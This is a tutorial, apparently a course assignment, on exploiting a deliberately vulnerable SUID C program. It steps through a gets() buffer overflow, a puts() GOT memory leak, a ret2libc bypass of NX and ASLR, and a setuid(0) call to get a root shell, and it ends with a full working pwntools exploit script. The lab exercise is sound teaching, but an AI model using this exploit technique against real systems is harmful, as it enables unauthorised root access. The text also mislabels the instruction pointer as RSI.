# Damn vulnerable app
Welcome!!!

This a vulnerable application written in 'c.'

In this tutorial I will show you how to bypass these two security controls on a linux operating system:
- NX: non-executable stack
- ASLR: Address Space Layout Randomization

# Dependencies
Below are a list of dependencies that are required in order to complete the exploitation:

**Exploit compiled and performed on >> cat /etc/os-release #output: Linux 5.10.0-kali9-amd64 SMP Debian 5.10.46-1kali1 (2021-06-25) x86_64 GNU/Linux Version: 2021.2** 


### install git
```sh
sudo apt-get install git
```
### update and install pwntools
```sh
sudo apt-get update
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
```

> **Note**: Do not install pwntools using root account!!!!

```sh
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```
### install  gdp-peda
```sh
sudo apt-get install gdb
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```

> **Note**: Sometimes the clipboard will have issues in linux and this program will help clear it out. Install if required.


```sh
sudo apt-get install xsel
xsel -cb    #to clear clip-board
```
# Compiling

### Clone code from:
```sh
sudo apt-get install git
```
```sh
In your target directory:
git clone https://github.com/ZEIT8042/assign2.git
```
### Compile vulnerable program
```sh
make                    //execute as root
```
#or
```sh
gcc -fno-stack-protector -no-pie vuln64.c -o vuln64
sudo chown root:root vuln64
sudo chmod u+s vuln64
```

## Execution
<link to video>
This program is sucseptible to a Buffer overflow (BoF) attack when the helpCommand() c function is called after the "Enter to continue...." prompt which allows user input to be placed direclty into into the buffer[] using the gets(buffer) command. The gets() function does not perform any bounds checking which allows for the stack to be overwritten. 

Security Controls bypass include non-executable stack (NX) and Address space layout randomization (ASLR). The NX-bit is a security control implemented  on modern CPU architectures used to mark certain areas of stack memory as "non-exectable" and is a common feature which mitigates attackers from placing malicious shellcode within a program's memory and executing. ASLR further enhances BoF protection by randomizing the address space of stack positions within the executable and libraries which makes attacks against the program less reliable.
#### Objectives
In this turtorial we will perform the following objectives:
1. overflow the programs buffer to gain control of the RSI register (x64)--> Find the offset
2. Execute a memory leak vulnerability within the puts() call using a ROP chain. 
3. Bypass NX (non-executable) Bof prevention mechanism by using the return-to-libc subroutine - using memory leak to find libc base address we will then bypass ASLR
4. Gain root shell, suprisingliy not through SUID

#### Method: 
1. Use gdb-peda to discover buffer offset address
2. Create ROP chain to puts() call and leak memory address using python3 pwntools
3. Calculate libc base address using memory leak and create another ROP chain to execute "/bin/sh" function. (NX and ASLR bypass)
4. Gain root shell by integrating setuid() function

# Exploit - Walkthrough
## Find the offset

Open up gdb peda and create a pattern string which will be used to discover the offset of our BoF.	

![](Assignment2/images/1.PNG)

Run the program using the 'h' as an argument switch. Copy the patter string into the vulnerable help function and hit enter. We will immediately see a SIGSEGV segmentation fault which indicates that the program has attempted to write outside of its allocated memory. 

![](Assignment2/images/2.PNG)

Use the in-built peda pattern_search command to calculate the offset number, of which we determine that the offset to this vulnerable function is '56'

![](Assignment2/images/3.PNG)

To confirm the offset, open another terminal, run a small python command and execute the vuln64 program again. Place the string into the prompt to overflow the buffer

![](Assignment2/images/4.PNG)

Execute the below command to verify the cause of the segfault.

![](Assignment2/images/5.PNG)

Returning to gdb, we perform the same and see that the RSI register is filled with BBBB, which indicates we have control over the execution flow of the program. 

> **Note** :The RIP register on x86-64 is a special purpose register that holds the memory address of the next executable instruction.

![](Assignment2/images/6.PNG)

## Create ROP chain to puts() call and leak memory address using python3 pwntools

Next, we will create our exploit and test to confirm that we can overflow the buffer.

![](Assignment2/images/9.PNG)

Executing our script with Python3

![](Assignment2/images/7.PNG)

Confirming that our exploit is working as intended.

![](Assignment2/images/8.PNG)

Here we progress by testing the memory leak vulnerability within the puts() call. This is performed using a ROP chain and returning back to the helpCommand() function. As you can see, we successfully leaked 


![](Assignment2/images/10_ROP.PNG)

The below code achieves memory leak by using pwntool's ROP inbuilt functions to automatically grab the PLT and GOT address of the puts() function, whereby it is printed to the terminal \x00\x00\x00\x00\x00 etc... 

Pwntools is able to achieve this on execution by loading the gadgets of the program and creating a ROP object which can be called by using the below:

elf = ELF(./vuln64)

rop = ROP(elf)

rop.call()

This says “call PLT’s puts() function and print the leaked memory address of the GOT’s puts() function”. Remembering that these are dynamically linked between the program and libc.

```sh
rop.call(elf.plt['puts'], [elf.got['puts']]) 
```

Creating a ROP chain by calling the PLT and GOT gadgets of the puts() function and then returning to the beginning of the helpComand() function.

![](Assignment2/images/11.PNG)

Here we go one step further by capturing the leaked address, storing it in our own variable and logging it to the console. We do this by using the rstrip() and ljust() modifiers to unpack the leaked 8 bytes into the 64-bit integer.


![](Assignment2/images/12.PNG)

Code used to capture leaked address in terminal and convert from 8bytes to 64-bit

![](Assignment2/images/13.PNG)

## Bypass NX and ASLR

Now that we have the leaked address, we can determine the libc base address (remember that ASLR is changing the address every time the program is executed). By calculating the distance between the leaked GOT puts() address, we can determine the address of the system[] call; which is used to call our shell.

We construct another ROP chain, but this time calling the system() libc function which allows us to then call execute '\bin\sh.'

![](Assignment2/images/16.PNG)

Executing our final exploit gives us a shell, however, even though that the vuln64 program has the SUID bit set, we cannot spawn another process of similar privileges due to linux security features where the 'real user ID' is different than the 'effective ID.' 

![](Assignment2/images/14.PNG)

## Gain root shell
To curcumvent this, we call the setuid() function before /bin/sh and set the UID to 0. Finally, we have the UID of 0 (root) when executing our exploit. 

![](Assignment2/images/15_root.PNG)


## Exploit code provided:

```sh
from pwn import *


context.arch = 'amd64' # set runtime variables in a global setting.

#initialize process for pwntools
elf = ELF("../app/vuln64")
p = elf.process(["../app/vuln64" , "h"])

########################################Stage 1 Offset & Memory leak#######################################

#ROP chain using embedded pwn functions which uses files symbols at runtime to extract plt addresses.
rop= ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']]) 		#find puts in procedural link table, print mem address of GOT put
rop.call(elf.sym['helpCommand'])			#return to helpCommand function in program

offset = 56

payload = [
	b"A" * offset,
	rop.chain()

]

payload = b"".join(payload)
p.sendline(payload)
p.recvline()
p.recvline()
puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00")) #store & unpack output. Perform strip
log.info(f"leaked puts@GLIBC found: {hex(puts)}" )	#log output to determine success


############################################Stage 2 Ret2libc##############################################

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")		#specify libc //can be determined by: ldd vuln64 | grep libc
libc.address = puts - libc.symbols["puts"]		#load symbols from libc and perform plt, GOt offset to find base address
log.info(f"libc base address: {hex(libc.address)}" )

binsh = next(libc.search(b"/bin/sh"))			#find /bin/sh address //can use: strings -atx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
rop.call(libc.sym.setuid, [0])				#final ROP chain, call setuid 0 i.e. root, execute /bin/sh, exit gracefully
rop.call(libc.sym.system, [binsh])
rop.call(libc.sym.exit)

payload = [
	b"A" * offset,
	rop.chain()

]

payload = b"".join(payload)				#send payload
p.sendline(payload)
p.recvline()

p.interactive()
```